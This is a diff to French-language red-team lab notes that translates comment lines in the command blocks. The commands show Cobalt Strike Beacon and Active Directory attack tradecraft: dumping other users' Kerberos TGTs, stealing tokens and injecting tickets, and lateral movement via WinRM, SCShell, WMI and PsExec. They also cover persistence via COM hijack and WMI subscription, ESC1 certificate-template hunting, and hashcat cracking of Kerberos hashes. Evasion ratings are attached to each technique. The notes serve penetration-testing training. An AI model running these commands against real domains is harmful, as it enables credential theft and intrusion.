@@ -218,13 +218,13 @@ C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist
 Exécuter les commandes suivantes dans la **fenêtre PowerShell ouverte avec `runas`**, où le ticket LDAP est disponible :
 
 ```powershell
-# Enumerate all computer objects
+# Énumérer les objets ordinateur
 Get-ADComputer -Filter * -Server lon-dc-1
 
-# Enumerate all user objects
+# Énumérer les comptes utilisateurs
 Get-ADUser -Filter * -Server lon-dc-1
 
-# Enumerate all OUs
+# Énumérer les unités d’organisation (OU)
 Get-ADOrganizationalUnit -Filter * -Server lon-dc-1
 ```
 
@@ -275,9 +275,9 @@ Tester ensuite la connexion depuis Proxifier avec une commande RSAT. Vérifier l
 ### Beacon inactif — vérifier la reprise de session
 
 ```cs
-// Option 1 — COM hijack (Teams DLL) — triggers when Teams next starts on the target
-// Option 2 — WMI subscription — trigger manually via gpupdate from another session
-// Option 3 — Re-run initial access vector (ngentask/AppDomainHijack) if no persistence deployed
+// Option 1 — COM hijack (DLL Teams) : déclenchement au prochain lancement de Teams
+// Option 2 — abonnement WMI : déclenchement manuel via gpupdate depuis une autre session
+// Option 3 — reprendre la méthode d’accès initial du lab en absence de persistence
 ```
 
 Si le Beacon était le seul point d’accès du lab, le tunnel ne peut pas fonctionner tant que la session n’est pas rétablie.
@@ -287,9 +287,9 @@ Si le Beacon était le seul point d’accès du lab, le tunnel ne peut pas fonct
 Les requêtes LDAP volumineuses peuvent être ralenties par l’intervalle de communication du Beacon. Les notes présentent un réglage plus interactif pour ces tests.
 
 ```cs
-beacon> sleep 0          // interactive — constant callback, no sleep delay
-// ... run your SOCKS-dependent enumeration ...
-beacon> sleep 3000 20    // restore: 3s sleep, 20% jitter
+beacon> sleep 0          // mode interactif : callbacks continus, sans pause
+// ... exécuter les contrôles nécessitant le proxy SOCKS ...
+beacon> sleep 3000 20    // revenir au sleep de 3 secondes et au jitter de 20 %
 ```
 
 > `OPSEC-🟠CAUTION` — `sleep 0` augmente la fréquence des callbacks et le volume de trafic. Le rétablissement du paramètre normal est nécessaire à la fin du test.
@@ -308,8 +308,8 @@ Le port `9389` correspond à Active Directory Web Services (ADWS), utilisé par 
 `krb_triage` permet de recenser les tickets des sessions accessibles depuis le contexte courant et d’identifier leur propriétaire.
 
 ```cs
-beacon> krb_triage                               // identify all live sessions
-beacon> krb_dump /user:pchilds /service:krbtgt   // example: second user logged in
+beacon> krb_triage                               // identifier les sessions actives
+beacon> krb_dump /user:pchilds /service:krbtgt   // exemple : deuxième utilisateur connecté
 beacon> krb_dump /user:<anyuser> /service:krbtgt
 ```
 
@@ -318,13 +318,13 @@ Noter les dates d’expiration des tickets, qui dépendent de la politique Kerbe
 ### Énumérer les appartenances aux groupes `OPSEC-🟢SAFE`
 
 ```powershell
-# In runas PowerShell window (LDAP ticket in session)
+# Dans la fenêtre PowerShell runas contenant le ticket LDAP
 Get-ADGroupMember "Domain Admins" -Server lon-dc-1 -Recursive
 Get-ADGroupMember "Enterprise Admins" -Server lon-dc-1 -Recursive
 Get-ADGroupMember "Remote Management Users" -Server lon-dc-1
 Get-ADGroupMember "Remote Desktop Users" -Server lon-dc-1
 
-# Check specific users found in enumeration
+# Examiner les utilisateurs identifiés pendant l’énumération
 Get-ADPrincipalGroupMembership <username> -Server lon-dc-1
 ```
 
@@ -360,7 +360,7 @@ hashcat -a 0 -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force
 Examiner les paramètres de préauthentification lorsque cela fait partie du périmètre :
 
 ```powershell
-# Check flag directly via RSAT
+# Contrôler l’attribut directement avec RSAT
 Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth -Server lon-dc-1
 ```
 
@@ -381,7 +381,7 @@ Les machines dont le nom contient `-CS-` ou `-CA-` peuvent héberger des service
 ```powershell
 Get-ADObject -Filter {objectClass -eq "pKIEnrollmentService"} -SearchBase "CN=Configuration,DC=contoso,DC=com" -Properties * -Server lon-dc-1 | Select Name,dNSHostName
 
-# List templates — look for ESC1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) flag
+# Lister les templates et examiner le flag ESC1 (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT)
 Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=com" -Filter * -Properties msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag,Name -Server lon-dc-1 | Select Name,msPKI-Certificate-Name-Flag,msPKI-Enrollment-Flag
 ```
 
@@ -401,15 +401,15 @@ Examiner les permissions `WriteDACL`, `GenericWrite`, `GenericAll`, `ForceChange
 Après validation d’un compte ou d’un ticket autorisé dans le lab :
 
 ```cs
-// Always impersonate first
-beacon> steal_token <pid>                           // OPSEC-🟢SAFE — preferred
-beacon> kerberos_ticket_use <path-to.kirbi>         // inject a dumped TGT
+// Vérifier le contexte d’impersonation avant de poursuivre
+beacon> steal_token <pid>                           // OPSEC-🟢SAFE — méthode privilégiée dans ces notes
+beacon> kerberos_ticket_use <path-to.kirbi>         // importer un TGT précédemment exporté
 
-// Then move — in OPSEC preference order
-beacon> jump winrm64 <target> smb                   // OPSEC-🟢SAFE — first choice
-beacon> jump scshell64 <target> smb                 // OPSEC-🟠CAUTION — no Event 7045
-beacon> remote-exec wmi <target> <payload-path>     // OPSEC-🟠CAUTION — no service
-beacon> jump psexec64 <target> smb                  // OPSEC-🔴UNSAFE — last resort only
+// Poursuivre selon le classement OPSEC de ces notes
+beacon> jump winrm64 <target> smb                   // OPSEC-🟢SAFE — premier choix dans ces notes
+beacon> jump scshell64 <target> smb                 // OPSEC-🟠CAUTION — ne crée pas le service décrit par l’événement 7045
+beacon> remote-exec wmi <target> <payload-path>     // OPSEC-🟠CAUTION — exécution WMI sans création de service
+beacon> jump psexec64 <target> smb                  // OPSEC-🔴UNSAFE — dernier recours dans le lab
 
-beacon> rev2self                                    // drop token after move succeeds
+beacon> rev2self                                    // abandonner le token d’impersonation lorsque l’opération est terminée
 ```
